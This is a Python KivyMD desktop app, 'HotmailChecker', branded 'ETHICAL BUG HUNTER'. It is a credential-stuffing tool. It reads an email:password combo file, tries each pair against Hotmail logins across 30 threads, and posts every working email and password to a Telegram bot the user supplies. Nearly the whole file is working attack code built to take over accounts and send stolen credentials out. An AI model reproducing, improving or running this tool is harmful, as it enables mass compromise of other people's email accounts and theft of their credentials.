import PKK
import requests
from concurrent.futures import ThreadPoolExecutor
from kivy.lang import Builder
from kivymd.app import MDApp
from kivymd.uix.boxlayout import BoxLayout
from kivymd.uix.label import MDLabel
from kivymd.uix.textfield import MDTextField
from kivymd.uix.button import MDRaisedButton
from kivymd.uix.card import MDCard
from kivy.clock import Clock

class HotmailChecker(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation="vertical", **kwargs)
        self.count_good = 0
        self.count_bad = 0

        # Header - Team Information with Green Color
        self.add_widget(MDLabel(
            text="TEAM: ETHICAL BUG HUNTER\nDeveloper: Last Warning\nTG ID: @hardhackar007",
            theme_text_color="Custom", text_color=(0, 1, 0, 1), font_style="H5", halign="center"
        ))

        # Token Input
        self.add_widget(MDLabel(text="Enter your Bot Token:", theme_text_color="Secondary", font_style="Body1"))
        self.token_input = MDTextField(hint_text="Your Telegram Bot Token")
        self.add_widget(self.token_input)

        # ID Input
        self.add_widget(MDLabel(text="Enter your Telegram ID:", theme_text_color="Secondary", font_style="Body1"))
        self.id_input = MDTextField(hint_text="Your Telegram ID")
        self.add_widget(self.id_input)

        # File Path Input
        self.add_widget(MDLabel(text="Enter your Combo Path:", theme_text_color="Secondary", font_style="Body1"))
        self.file_input = MDTextField(hint_text="Path to combo.txt")
        self.add_widget(self.file_input)

        # Start Button
        self.start_button = MDRaisedButton(text="START", on_press=self.start_check, size_hint=(None, None), size=("200dp", "50dp"))
        self.add_widget(self.start_button)

        # Status Labels
        self.status_label = MDLabel(text="Waiting for input...", theme_text_color="Secondary", font_style="Subtitle1", halign="center")
        self.add_widget(self.status_label)

        # Good Login Label (Big & Green)
        self.good_label = MDLabel(text="✅ GOOD LOGINS: 0", theme_text_color="Custom", text_color=(0, 1, 0, 1), font_style="H6", halign="center")
        self.add_widget(self.good_label)

        # Bad Login Label (Big & Red)
        self.bad_label = MDLabel(text="❌ BAD LOGINS: 0", theme_text_color="Custom", text_color=(1, 0, 0, 1), font_style="H6", halign="center")
        self.add_widget(self.bad_label)

    def start_check(self, instance):
        token = self.token_input.text
        chat_id = self.id_input.text
        file_path = self.file_input.text

        if not token or not chat_id or not file_path:
            self.status_label.text = "❌ Please fill all fields!"
            return

        self.status_label.text = "⏳ Checking logins..."
        executor = ThreadPoolExecutor(max_workers=30)

        try:
            with open(file_path, "r") as f:
                for line in f:
                    if ":" in line:
                        email, password = line.strip().split(":", 1)
                        executor.submit(self.login, email, password, token, chat_id)
        except Exception as e:
            self.status_label.text = f"⚠️ Error: {e}"

    def login(self, email, password, token, chat_id):
        try:
            response = PKK.Hotmail.Login(email, password)
            if response.get("Login") == "Good":
                self.count_good += 1
                telegram_message = f"""
┏━━━━━━━⍟
┃ {email}
┗━━━━━━━━━━━⊛
┏━━━━⍟
┃ {password}
┗━━━━━━━━━━━⊛
☠️ TOOL DEVELOPER BY LAST WARNING  
    TG ID @hardhackar007 ☠️
┏━━━━━━━⍟
┃ Login URL: https://login.live.com
┃ TEAM: ETHICAL BUG HUNTER
┗━━━━━━━━━━━⊛
"""
                requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={telegram_message}")
                Clock.schedule_once(lambda dt: self.update_good_label(), 0)
            else:
                self.count_bad += 1
                Clock.schedule_once(lambda dt: self.update_bad_label(), 0)
        except Exception as e:
            pass

    def update_good_label(self):
        self.good_label.text = f"✅ GOOD LOGIN: {self.count_good}"

    def update_bad_label(self):
        self.bad_label.text = f"❌ BAD LOGIN: {self.count_bad}"

class HotmailCheckerApp(MDApp):
    def build(self):
        return HotmailChecker()

if __name__ == "__main__":
    HotmailCheckerApp().run()
